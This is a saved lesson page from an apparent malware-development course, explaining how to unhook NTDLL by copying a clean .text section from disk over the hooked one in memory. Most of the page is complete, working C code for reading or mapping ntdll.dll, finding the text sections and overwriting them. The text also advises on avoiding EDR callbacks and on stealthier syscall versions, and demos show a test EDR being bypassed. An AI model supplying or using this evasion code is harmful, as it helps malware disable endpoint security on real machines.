<!DOCTYPE html>
<html class="dark"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <meta name="csrf-token" content="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">
        <link rel="stylesheet" href="NTDLL%20Unhooking%20-%20From%20Disk_files/template.css">
        <link rel="shortcut icon" href="https://maldevacademy.com/favicon.ico">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="NTDLL%20Unhooking%20-%20From%20Disk_files/font-awesome.min.css">
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="NTDLL%20Unhooking%20-%20From%20Disk_files/css2.css" rel="stylesheet">
        <link href="NTDLL%20Unhooking%20-%20From%20Disk_files/css2_002.css" rel="stylesheet">
        <title>NTDLL Unhooking - From Disk</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="NTDLL%20Unhooking%20-%20From%20Disk_files/app.fdbb573b.css"><link rel="stylesheet" href="NTDLL%20Unhooking%20-%20From%20Disk_files/app.fdbb573b.css"><link rel="stylesheet" href="NTDLL%20Unhooking%20-%20From%20Disk_files/viewer.css">
    </head>
    <body>
        <nav id="navbar" class="px-2 sm:px-4 py-2.5 bg-gray-900 sticky hidden">
    <div class="container flex flex-wrap justify-between mx-auto">
      <a data-target="_self" href="https://maldevacademy.com/" class="flex items-center">
        <div class="main-logo flex flex-row items-center">
            <span class="text-xl logo-font text-white">MALDEV</span>
            <img class="w-[25px] mx-2 relative bottom-1" src="NTDLL%20Unhooking%20-%20From%20Disk_files/logo-bug-2.png" alt="Logo">   
            <span class="text-xl logo-font text-white">ACADEMY</span>          
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 bg-gray-50 rounded-lg border border-gray-100 md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 md:bg-white dark:bg-gray-800 md:dark:bg-gray-900 dark:border-gray-700">
          <li>
            <a data-target="_self" href="https://maldevacademy.com/" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>
          <li>
            <a data-target="_self" href="https://maldevacademy.com/faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>
          <li>
            <a data-target="_self" href="https://maldevacademy.com/syllabus" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Syllabus</a>
          </li>
                              <li>
            <a data-target="_self" href="https://maldevacademy.com/pricing" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Pricing</a>
          </li>
                                        <li>
            <a data-target="_self" href="https://maldevacademy.com/profile" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Profile</a>
          </li>
          <li>
            <form action="https://maldevacademy.com/logout" method="POST">
            <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">              <button type="submit" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Logout</button>
            </form>
          </li>
          <li class="mt-4 md:mt-0">
            <a data-target="_self" href="https://maldevacademy.com/modules" class="text-white bg-blue-700 hover:bg-blue-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">Modules</a>
          </li>
                  </ul>
      </div>
    </div>
  </nav>        <div class="bg-gray-900 p-4">
    <div class="flex">
        <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700 border-l border-t border-gray-600 pl-4 pt-2 pb-2 rounded-tl">
            <div>
                Module 84 - NTDLL Unhooking - From Disk
            </div>
            <div class="ml-2 w-4 h-4 bg-red-600 rounded-full"></div>
        </div>
        <div class="flex justify-end items-center w-1/2 bg-gray-700 pr-4 pt-2 pb-2 rounded-tr border-t border-r border-gray-600">
            <div class="enlarge-container pr-4">
                <img src="NTDLL%20Unhooking%20-%20From%20Disk_files/enlarge.svg" onclick="toggleScreenWidth()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="enlargeToggle" alt="Screen Width" width="20px">
            </div>
            <div class="objectives-container pr-4">
                <img src="NTDLL%20Unhooking%20-%20From%20Disk_files/objectives.svg" onclick="toggleObjectives()" class="hover:bg-gray-600 cursor-pointer" id="objectivesToggle" alt="Objectives" width="20px">
            </div>
            <div class="terminal-container  pr-4 ">
                <img src="NTDLL%20Unhooking%20-%20From%20Disk_files/ide.svg" onclick="toggleIde()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="terminalToggle" alt="Terminal" width="22px">
            </div>
                                    <div class="dl-container">
                <a href="https://maldevacademy.com/download/file/DiskUnhooking" target="_blank">
                    <img src="NTDLL%20Unhooking%20-%20From%20Disk_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" alt="Download" width="20px">
                </a>
            </div>
                                </div>
    </div>
    <div id="height-container" class="flex h-full min-h-[800px]">
        <div class="flex max-w-full min-w-full">
            <div id="description-container" class="viewer code-description h-full bg-gray-800 p-4 border-r border-l border-b border-gray-600 px-5 md:px-10 lg:px-20 w-full"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">
            <h2>NTDLL Unhooking - From Disk</h2>
<h3>Introduction</h3>
<p>This module demonstrates how one can implement NTDLL unhooking by 
overwriting the hooked NTDLL's text section with an unhooked version 
from an NTDLL image on disk. The steps to perform NTDLL unhooking will 
be as follows:</p>
<ol>
<li>
<p>Retrieve a handle to a clean version of NTDLL from disk by either 
reading it or mapping it (both methods are demonstrated below).</p>
</li>
<li>
<p>Fetch the hooked NTDLL's handle that belongs to the current process.</p>
</li>
<li>
<p>Retrieve the text section of the hooked NTDLL.</p>
</li>
<li>
<p>Retrieve the text section of the clean NTDLL.</p>
</li>
<li>
<p>Overwrite the hooked NTDLL's text section with the unhooked NTDLL's text section.</p>
</li>
</ol>
<p>With that being said, let's start with the first step which is to retrieve a handle for the clean NTDLL image.</p>
<h3>Retrieving NTDLL</h3>
<p>Retrieving a clean version of NTDLL from disk can be done using the methods described in the sections below.</p>
<h4>ReadFile WinAPI</h4>
<p>One of the obvious ways to read <code>ntdll.dll</code> from disk is using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfile" target="_blank">ReadFile</a> WinAPI which can be used to read files from disk. It is important to keep in mind that the text section of the <code>ntdll.dll</code> file will have an offset of 1024.</p>
<p>The <code>ntdll.dll</code> file can be read from disk using the custom <code>ReadNtdllFromDisk</code> function shown below which uses <code>GetWindowsDirectoryA</code>, <code>CreateFileA</code>, <code>GetFileSize</code> and <code>ReadFile</code> WinAPIs. Again, recall that the DLL file is stored inside <code>C:\Windows\System32\</code>.</p>
<p>The <code>ReadNtdllFromDisk</code> function will return <code>TRUE</code> if it succeeds in reading the ntdll.dll file. It has a single OUT parameter, <code>ppNtdllBuf</code>, which holds the base address of the <code>ntdll.dll</code>.</p>
<pre><code>#define NTDLL "NTDLL.DLL"


BOOL ReadNtdllFromDisk(OUT PVOID* ppNtdllBuf) {

	CHAR	    cWinPath    [MAX_PATH / 2]    = { 0 };
	CHAR	    cNtdllPath  [MAX_PATH]        = { 0 };
	HANDLE      hFile                         = NULL;
	DWORD       dwNumberOfBytesRead           = NULL,
                dwFileLen                     = NULL;
	PVOID       pNtdllBuffer                  = NULL;

	// getting the path of the Windows directory
	if (GetWindowsDirectoryA(cWinPath, sizeof(cWinPath)) == 0) {
		printf("[!] GetWindowsDirectoryA Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	// 'sprintf_s' is a more secure version than 'sprintf'
	sprintf_s(cNtdllPath, sizeof(cNtdllPath), "%s\\System32\\%s", cWinPath, NTDLL);

	// getting the handle of the ntdll.dll file
	hFile = CreateFileA(cNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileA Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	// allocating enough memory to read the ntdll.dll file
	dwFileLen     = GetFileSize(hFile, NULL);
	pNtdllBuffer  = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileLen);

	// reading the file
	if (!ReadFile(hFile, pNtdllBuffer, dwFileLen, &amp;dwNumberOfBytesRead, NULL) || dwFileLen != dwNumberOfBytesRead) {
		printf("[!] ReadFile Failed With Error : %d \n", GetLastError());
		printf("[i] Read %d of %d Bytes \n", dwNumberOfBytesRead, dwFileLen);
		goto _EndOfFunc;
	}

	*ppNtdllBuf = pNtdllBuffer;

_EndOfFunc:
	if (hFile)
		CloseHandle(hFile);
	if (*ppNtdllBuf == NULL)
		return FALSE;
	else
		return TRUE;
}
</code></pre>
<h4>Mapping NTDLL</h4>
<p>The <code>CreateFileMappingA</code> and <code>MapViewOfFile</code> WinAPIs can also be used to read the <code>ntdll.dll</code> file from <code>C:\Windows\System32\</code>.
 When using these WinAPIs, the text section offset will be 4096 rather 
than 1024. This is because the image is mapped which causes the Windows 
loader to apply this alignment modification. Without the <code>SEC_IMAGE</code> or <code>SEC_IMAGE_NO_EXECUTE</code> flags in <code>CreateFileMappingA</code>, this alignment will not occur and therefore the offset remains at 1024.</p>
<p>The <code>SEC_IMAGE_NO_EXECUTE</code> flag will be used in the implementation below because it doesn't trigger the <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetloadimagenotifyroutine" target="_blank">PsSetLoadImageNotifyRoutine</a>
 callback. This means that the use of this flag will not alert EDRs and 
other security products that are utilizing this function when ntdll.dll 
is mapped into memory. This is indicated in the Windows documentation 
for <code>CreateFileMappingA</code> as shown below.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20Disk_files/ntdll-unhooking-disk-118295799-85ce595b-6772-44bf-b764-0ba03.png" alt="image"></p>
<p>Fetching <code>ntdll.dll</code> from disk using the mapping WinAPIs is done via the custom <code>MapNtdllFromDisk</code> function below. <code>MapNtdllFromDisk</code> returns <code>TRUE</code> if it succeeds in reading the ntdll.dll file.</p>
<pre><code>#define NTDLL "NTDLL.DLL"

BOOL MapNtdllFromDisk(OUT PVOID* ppNtdllBuf) {

	HANDLE  hFile                           = NULL,
		    hSection                        = NULL;
	CHAR    cWinPath    [MAX_PATH / 2]      = { 0 };
	CHAR    cNtdllPath  [MAX_PATH]          = { 0 };
	PBYTE   pNtdllBuffer                    = NULL;

	// getting the path of the Windows directory
	if (GetWindowsDirectoryA(cWinPath, sizeof(cWinPath)) == 0) {
		printf("[!] GetWindowsDirectoryA Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	// 'sprintf_s' is a more secure version than 'sprintf'
	sprintf_s(cNtdllPath, sizeof(cNtdllPath), "%s\\System32\\%s", cWinPath, NTDLL);

	// getting the handle of the ntdll.dll file
	hFile = CreateFileA(cNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileA Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	// creating a mapping view of the ntdll.dll file using the 'SEC_IMAGE_NO_EXECUTE' flag
	hSection = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, NULL, NULL, NULL);
	if (hSection == NULL) {
		printf("[!] CreateFileMappingA Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	// mapping the view of file of ntdll.dll
	pNtdllBuffer = MapViewOfFile(hSection, FILE_MAP_READ, NULL, NULL, NULL);
	if (pNtdllBuffer == NULL) {
		printf("[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	*ppNtdllBuf = pNtdllBuffer;

_EndOfFunc:
	if (hFile)
		CloseHandle(hFile);
	if (hSection)
		CloseHandle(hSection);
	if (*ppNtdllBuf == NULL)
		return FALSE;
	else
		return TRUE;
}
</code></pre>
<p>Both <code>ReadNtdllFromDisk</code> and <code>MapNtdllFromDisk</code> functions perform the same task but will result in a different text section offset.</p>
<h3>Reading vs Mapping NTDLL</h3>
<p>Sometimes when the <code>ntdll.dll</code> file is read from disk 
rather than mapped to memory, the offset of its text section might be 
4096 instead of the expected 1024. Mapping the <code>ntdll.dll</code> file to memory is more reliable since the text section offset will always equal the <code>IMAGE_SECTION_HEADER.VirtualAddress</code> offset of the DLL file.</p>
<h3>Unhooking</h3>
<p>Several actions need to be taken to unhook <code>ntdll.dll</code>. These actions will be demonstrated step-by-step to aid simplicity.</p>
<h4>1 - Fetching The Local Ntdll.dll Image Handle</h4>
<p>In order to replace the text section of the locally hooked <code>ntdll.dll</code>,
 the base address and size of it must first be obtained. This can be 
done in various ways, but first, a handle to the local NTDLL module must
 be obtained. This can be achieved using <code>GetModuleHandleA("ntdll.dll")</code> or with the custom <code>GetModuleHandle</code> implementation demonstrated in prior modules. For now, the <code>FetchLocalNtdllBaseAddress</code> function will be used to complete this task.</p>
<pre><code>PVOID FetchLocalNtdllBaseAddress() {

#ifdef _WIN64
	PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
	PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif // _WIN64

	// Reaching to the 'ntdll.dll' module directly (we know its the 2nd image after the local image name)
	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);

	return pLdr-&gt;DllBase;
}
</code></pre>
<ul>
<li>
<p><code>pPeb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink</code>
 is a pointer to the second entry in the linked list. The function skips
 the first entry because that is related to the local image (e.g. 
DiskUnhooking.exe). The second entry, however, is related to the <code>ntdll.dll</code> module.</p>
</li>
<li>
<p>Although <code>pPeb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink</code> is a pointer to the second entry, it points to the end of the entry rather than the beginning of it. The size of the <code>LIST_ENTRY</code> structure is <code>0x10</code>, therefore <code>0x10</code> is subtracted to move the pointer to the beginning of the second entry, which is the position of <code>ntdll.dll</code> as explained in the first point.</p>
</li>
<li>
<p><code>return pLdr-&gt;DllBase</code> returns the handle/base address of the <code>ntdll.dll</code> image.</p>
</li>
</ul>
<h4>2 - Fetching The Local Ntdll.dll's Text Section</h4>
<p>After using the <code>FetchLocalNtdllBaseAddress</code> function to retrieve a handle to the local <code>ntdll.dll</code>, the base address and size of its text section can now be retrieved. Two methods of doing so are demonstrated below.</p>
<h5>Method 1 - Optional Header Structure</h5>
<p>The first method uses the <code>Optional Header</code> structure since <code>IMAGE_OPTIONAL_HEADER</code> contains the RVA of the base address of the text section (<code>BaseOfCode</code>) along with its size (<code>SizeOfCode</code>). A few variables are explained for the code snippet to be understood:</p>
<ul>
<li>
<p><code>pLocalNtdll</code> is the base address of the <code>ntdll.dll</code> image returned by <code>FetchLocalNtdllBaseAddress</code>.</p>
</li>
<li>
<p><code>pLocalNtdllTxt</code> is the text section's base address.</p>
</li>
<li>
<p><code>sNtdllTxtSize</code> is the text section's size.</p>
</li>
</ul>
<pre><code>PIMAGE_DOS_HEADER	pLocalDosHdr	= (PIMAGE_DOS_HEADER)pLocalNtdll;
if (pLocalDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
	return FALSE;

PIMAGE_NT_HEADERS 	pLocalNtHdrs	= (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr-&gt;e_lfanew);
if (pLocalNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE) 
	return FALSE;

PVOID	pLocalNtdllTxt	= (PVOID)(pLocalNtHdrs-&gt;OptionalHeader.BaseOfCode + (ULONG_PTR)pLocalNtdll);
SIZE_T	sNtdllTxtSize	= pLocalNtHdrs-&gt;OptionalHeader.SizeOfCode;	
</code></pre>
<h5>Method 2 - IMAGE_SECTION_HEADER Structure</h5>
<p>The second method searches for the text section in the <code>IMAGE_SECTION_HEADER</code> structure array. This was previously demonstrated in the <em>Parsing PE Headers</em> module.</p>
<ul>
<li>
<p><code>pLocalNtHdrs</code> is a pointer to the Nt headers structure</p>
</li>
<li>
<p><code>pLocalNtdllTxt</code> and <code>sNtdllTxtSize</code> are the text section's base address and its size, respectively.</p>
</li>
</ul>
<p>When <code>pSectionHeader[i].Name</code> is equal to ".text", the if statement performs a string comparison against the first 4 characters, being ".tex". The <code>(*ULONG)*</code>
 expression reverses the value of ".tex" to be "xet.". This happens 
because the least significant byte will be read first and placed in the 
most significant position of the <code>ULONG</code> value, and the most significant byte will be read last and placed in the least significant position of the <code>ULONG</code> value. After that, a bitwise OR operation is done against the string "xet." with <code>0x20202020</code> to align it to a 32-bit boundary, which results in the 'xet.' value, that is <code>0x7865742E</code> in hex.</p>
<p>This is done to avoid using the <code>strcmp</code> function. An 
alternative approach could have been performed using a string hashing 
function where the hash value of the ".text" string is calculated and 
compared to that of <code>pSectionHeader[i].Name</code>.</p>
<pre><code>PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);

for (int i = 0; i &lt; pLocalNtHdrs-&gt;FileHeader.NumberOfSections; i++) {

	// if( strcmp(pSectionHeader[i]-&gt;Name, ".text") == 0) )
	if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.') {
		PVOID pLocalNtdllTxt	= (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
		SIZE_T sNtdllTxtSize	= pSectionHeader[i].Misc.VirtualSize;
		break;
	}
}
</code></pre>
<p>This method will be used to retrieve the required information about the text section in all the NTDLL unhooking modules.</p>
<h4>3 - Fetching The Unhooked Ntdll.dll's Text Section</h4>
<p>The next step is to get the base address of the unhooked <code>ntdll.dll</code>'s text section. This can be done using either <code>ReadNtdllFromDisk</code> or <code>MapNtdllFromDisk</code>
 functions. Then simply add that base address to the offset of the text 
section, which will differ depending on which function was used to 
retrieve the unhooked <code>ntdll.dll</code>'s text section.</p>
<p>If <code>ReadNtdllFromDisk</code> is used then the text section's offset will be equal to 1024 bytes. Otherwise, if <code>MapNtdllFromDisk</code> is used then the text section's offset will be equal to the NTDLL's <code>IMAGE_SECTION_HEADER.VirtualAddress</code>, which is generally 4096 bytes.</p>
<p>The pseudocode below shows the process for both scenarios.</p>
<pre><code>// Mapped
PVOID pUnhookedTxtNtdll = (ULONG_PTR)(MapNtdllFromDisk output) + (4096 or IMAGE_SECTION_HEADER.VirtualAddress of ntdll.dll);

// Read
PVOID pUnhookedTxtNtdll = (ULONG_PTR)(ReadNtdllFromDisk output) + 1024;
</code></pre>
<h4>4 - Text Section Replacement</h4>
<p>Having obtained all the necessary information, the next step is to 
swap the hooked NTDLL text section with the unhooked one. This is done 
via <code>memcpy</code>, where the destination parameter is the base address of the hooked text section and the source is the unhooked text section.</p>
<p>Recall that the memory permission of the text section should be 
modified to allow execution and writing. This will be done using the <code>VirtualProtect</code> WinAPI by setting the <code>PAGE_EXECUTE_WRITECOPY</code> or <code>PAGE_EXECUTE_READWRITE</code> flags.</p>
<p>After successfully updating the text sections, <code>VirtualProtect</code> should be called again to restore the previous memory permissions of the text section, <code>PAGE_EXECUTE_READ</code>.</p>
<h3>The Unhooking Function</h3>
<p>The following <code>ReplaceNtdllTxtSection</code> function will be used in the upcoming modules as well. The function has one parameter, <code>pUnhookedNtdll</code>, which is the base address of the unhooked <code>ntdll.dll</code>.</p>
<p>The function also has preprocessor code that modifies the offset of 
the text section depending on which method was used to fetch the <code>ntdll.dll</code> file. If <code>MAP_NTDLL</code> is defined, the offset will be <code>pSectionHeader[i].VirtualAddress</code>. Alternatively, if <code>READ_NTDLL</code> is defined, the offset is set to 1024.</p>
<p>Defining <code>MAP_NTDLL</code> or <code>READ_NTDLL</code> will be left up to the user, depending on which function was used to read <code>ntdll.dll</code>.</p>
<pre><code>// #define MAP_NTDLL
// or
// #define READ_NTDLL

BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {

	PVOID               pLocalNtdll	= (PVOID)FetchLocalNtdllBaseAddress();

	// getting the dos header
	PIMAGE_DOS_HEADER   pLocalDosHdr	= (PIMAGE_DOS_HEADER)pLocalNtdll;
	if (pLocalDosHdr &amp;&amp; pLocalDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;
	
	// getting the nt headers
	PIMAGE_NT_HEADERS   pLocalNtHdrs	= (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pLocalDosHdr-&gt;e_lfanew);
	if (pLocalNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE) 
		return FALSE;


	PVOID		pLocalNtdllTxt	= NULL,	// local hooked text section base address
			    pRemoteNtdllTxt  = NULL; // the unhooked text section base address
	SIZE_T		sNtdllTxtSize	= NULL; // the size of the text section


	// getting the text section
	PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pLocalNtHdrs);
	
	for (int i = 0; i &lt; pLocalNtHdrs-&gt;FileHeader.NumberOfSections; i++) {
		
		// the same as if( strcmp(pSectionHeader[i].Name, ".text") == 0 )
		if ((*(ULONG*)pSectionHeader[i].Name | 0x20202020) == 'xet.') {

			pLocalNtdllTxt	= (PVOID)((ULONG_PTR)pLocalNtdll + pSectionHeader[i].VirtualAddress);
#ifdef MAP_NTDLL
			pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + pSectionHeader[i].VirtualAddress);
#endif 
#ifdef READ_NTDLL
			pRemoteNtdllTxt = (PVOID)((ULONG_PTR)pUnhookedNtdll + 1024);	
#endif 
			sNtdllTxtSize	= pSectionHeader[i].Misc.VirtualSize;
			break;
		}
	}


	// small check to verify that all the required information is retrieved
	if (!pLocalNtdllTxt || !pRemoteNtdllTxt || !sNtdllTxtSize)
		return FALSE;
	

	DWORD dwOldProtection = NULL;

	// making the text section writable and executable
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, PAGE_EXECUTE_WRITECOPY, &amp;dwOldProtection)) {
		printf("[!] VirtualProtect [1] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// copying the new text section 
	memcpy(pLocalNtdllTxt, pRemoteNtdllTxt, sNtdllTxtSize);
	
	// rrestoring the old memory protection
	if (!VirtualProtect(pLocalNtdllTxt, sNtdllTxtSize, dwOldProtection, &amp;dwOldProtection)) {
		printf("[!] VirtualProtect [2] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	
	return TRUE;
}
</code></pre>
<h3>Handling Edge Cases</h3>
<p>Recall that when the <code>ntdll.dll</code> file is read from disk 
rather than mapped to memory, the offset of the text section may be 4096
 instead of 1024. To solve this problem programmatically, the following 
if-statement is added to the <code>ReplaceNtdllTxtSection</code> function.</p>
<p>If <code>READ_NTDLL</code> is defined, the if-statement is included 
to determine the text section's offset. This is done by comparing the 
first four bytes of the calculated base address with that of <code>pLocalNtdllTxt</code>.
 If they are equal, the new NTDLL's text section's offset is 1024 and 
the calculated base address does not need to be modified. Otherwise, the
 offset is 4096 and additional modifications are required.</p>
<pre><code>#ifdef READ_NTDLL
	// small check to verify that 'pRemoteNtdllTxt' is really the base address of the text section
	if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt) {
		// if not, then the read text section is of offset 4096, so we add 3072 (because we added 1024 already)
		(ULONG_PTR)pRemoteNtdllTxt += 3072;
		// checking again
		if (*(ULONG*)pLocalNtdllTxt != *(ULONG*)pRemoteNtdllTxt)
			return FALSE;
	}
#endif
</code></pre>
<h4>Example</h4>
<p>The first four bytes of <code>ntdll.dll</code> are <code>0xCC 0xCC 0xCC 0xCC</code>.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20Disk_files/ntdll-unhooking-disk-218424594-28bea557-3659-4d92-84e2-fc569.png" alt="image"></p>
<p>If the first 4 bytes are not equal to <code>0xCC 0xCC 0xCC 0xCC</code> then <code>pRemoteNtdllTxt</code>
 is miscalculated. Therefore, the actual text section offset is 4096 and
 so an additional 3072 are added to that address since 1024 was already 
checked. The recalculation is demonstrated in the following image.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20Disk_files/ntdll-unhooking-disk-318424215-3ec0d749-437d-42cb-b138-c925a.png" alt="image"></p>
<h3>Improving The Implementation</h3>
<p>The current implementation unhooks <code>ntdll.dll</code> using 
WinAPIs. For a stealthier implementation, direct or indirect syscalls 
should be used to perform unhooking. This will be left as an objective 
for the reader.</p>
<h3>Disk Unhooking Risks</h3>
<p>Before demonstrating NTDLL unhooking from disk, it's important to be 
aware that while this approach may be effective, it's being detected far
 more easily due to its widespread use in bypassing security solutions. 
Security vendors have a larger number of heuristic signatures developed 
to detect this technique compared to alternative methods. The upcoming 
unhooking modules are considered better alternatives.</p>
<h3>Demo 1</h3>
<p>The hooked ntdll.dll text section to be replaced.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20Disk_files/ntdll-unhooking-disk-418457505-d1001776-7d96-4177-9320-4fa80.png" alt="image"></p>
<br>
<p>The text section base address of the unhooked ntdll.dll.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20Disk_files/ntdll-unhooking-disk-518457513-3ccc44f1-e96f-489c-a4fb-a4f45.png" alt="image"></p>
<br>
<p>Replacing the text section.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20Disk_files/ntdll-unhooking-disk-618457520-f7c9130c-70bb-48a1-ab62-7c875.png" alt="image"></p>
<br>
<h3>Demo 2</h3>
<p>The hooked ntdll.dll text section to be replaced.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20Disk_files/ntdll-unhooking-disk-718459846-589d3a07-a934-4d32-bbdb-45bb2.png" alt="image"></p>
<br>
<p>Miscalculating the text section base address.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20Disk_files/ntdll-unhooking-disk-818459854-9d1de617-884f-441b-85c1-17386.png" alt="image">
<br></p>
<p>Recalculating the base address.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20Disk_files/ntdll-unhooking-disk-918459862-619987f0-38ee-48c7-90f3-45b50.png" alt="image"></p>
<p>Replacing the text section.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20Disk_files/ntdll-unhooking-disk-10.png" alt="image"></p>
<br>
<h3>Demo 3</h3>
<p>This demo demonstrates how NTDLL unhooking evades userland hooks installed by circumventing the previously introduced <code>MalDevEdr.dll</code> program.</p>
<p>To verify the effectiveness of the <code>DiskUnhooking.exe</code> implementation, the <code>PrintState</code> function has been added which prints the syscall's name and its address to the console. This function requires two parameters: <code>cSyscallName</code>, which represents the name of the syscall, and <code>pSyscallAddress</code>,
 which represents the syscall's address. By analyzing the opcodes of the
 specified syscall and comparing them to the opcodes that a typical 
syscall would begin with, <code>PrintState</code> determines whether or not the syscall has been hooked.</p>
<p>Recall that the opcodes of a syscall are <code>4C 8B D1 B8</code>. This is equivalent to the <code>mov r10, rcx</code> and <code>mov eax, &lt;SSN&gt;</code> instructions.</p>
<pre><code>VOID PrintState(char* cSyscallName, PVOID pSyscallAddress) {
	printf("[#] %s [ 0x%p ] ---&gt; %s \n", cSyscallName, pSyscallAddress, (*(ULONG*)pSyscallAddress != 0xb8d18b4c) == TRUE ? "[ HOOKED ]" : "[ UNHOOKED ]");
}
</code></pre>
<p>Inject <code>MalDevEdr.dll</code> to <code>DiskUnhooking.exe</code>.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20Disk_files/ntdll-unhooking-disk-new-1.png" alt="A0">
<br></p>
<p><code>MalDevEdr.dll</code> is injected and running.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20Disk_files/ntdll-unhooking-disk-new-2.png" alt="A1">
<br></p>
<p><code>PrintState</code>'s output shows that the NtProtectVirtualMemory syscall is hooked.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20Disk_files/ntdll-unhooking-disk-new-3.png" alt="A2">
<br></p>
<p>When <code>DiskUnhooking.exe</code> resumes execution, <code>MalDevEdr.dll</code> detects <code>NtProtectVirtualMemory</code> being called. After that, <code>DiskUnhooking.exe</code> unhooks <code>NtProtectVirtualMemory</code>.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20Disk_files/ntdll-unhooking-disk-new-4.png" alt="A3">
<br></p>
<p>Attaching xdbg to the <code>DiskUnhooking.exe</code> process shows that the <code>NtProtectVirtualMemory</code> syscall is normal, even though <code>MalDevEdr.dll</code> is still injected. This proves that the userland hooks were successfully removed in the current process.</p>
<p><img src="NTDLL%20Unhooking%20-%20From%20Disk_files/ntdll-unhooking-disk-new-5.png" alt="A4"></p>
